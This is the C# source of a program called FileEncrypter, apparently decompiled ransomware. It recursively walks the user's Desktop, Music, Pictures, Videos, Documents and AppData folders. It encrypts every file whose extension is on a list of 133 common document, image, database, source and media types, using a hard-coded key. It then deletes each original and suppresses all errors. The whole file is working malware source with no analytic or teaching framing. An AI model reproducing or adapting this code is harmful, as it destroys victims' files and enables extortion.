using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace FileEncrypter;

internal class Program
{
	private static void Main(string[] args)
	{
		foreach (string item in new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
		})
		{
			GetFilesAndEncrypt(item);
		}
	}

	private static void GetFilesAndEncrypt(string Ps)
	{
		try
		{
			string[] source = new string[133]
			{
				".jpg", ".jpeg", ".raw", ".tif", ".gif", ".png", ".bmp", ".3dm", ".max", ".accdb",
				".db", ".dbf", ".mdb", ".pdb", ".sql", ".dwg", ".dxf", ".c", ".cpp", ".cs",
				".h", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".py", ".js", ".rar",
				".zip", ".7zip", ".7z", ".dat", ".csv", ".efx", ".sdf", ".vcf", ".xml", ".ses",
				".aaf", ".aep", ".aepx", ".plb", ".prel", ".prproj", ".aet", ".ppj", ".psd", ".indd",
				".indl", ".indt", ".indb", ".inx", ".idml", ".pmd", ".xqx", ".xqx", ".ai", ".eps",
				".ps", ".svg", ".swf", ".fla", ".as3", ".as", ".txt", ".doc", ".dot", ".docx",
				".docm", ".dotx", ".dotm", ".docb", ".rtf", ".wpd", ".wps", ".msg", ".pdf", ".xls",
				".xlt", ".xlm", ".xlsx", ".xlsm", ".xltx", ".xltm", ".xlsb", ".xla", ".xlam", ".xll",
				".xlw", ".ppt", ".pot", ".pps", ".pptx", ".pptm", ".potx", ".potm", ".ppam", ".ppsx",
				".ppsm", ".sldx", ".sldm", ".wav", ".mp3", ".aif", ".iff", ".m3u", ".m4u", ".mid",
				".mpa", ".wma", ".ra", ".avi", ".mov", ".mp4", ".3gp", ".mpeg", ".3g2", ".asf",
				".asx", ".flv", ".mpg", ".wmv", ".vob", ".m3u8", ".mkv", ".m4a", ".ico", ".dic",
				"rex", ".hmg", ".config"
			};
			string[] files = Directory.GetFiles(Ps);
			foreach (string text in files)
			{
				string extension = Path.GetExtension(text);
				if (source.Contains(extension))
				{
					Utils.FileEncrypt(text, "qFrR2xkSloCh6O22AyUC");
					File.Delete(text);
				}
			}
			files = Directory.GetDirectories(Ps);
			for (int i = 0; i < files.Length; i++)
			{
				GetFilesAndEncrypt(files[i]);
			}
		}
		catch
		{
		}
	}
}
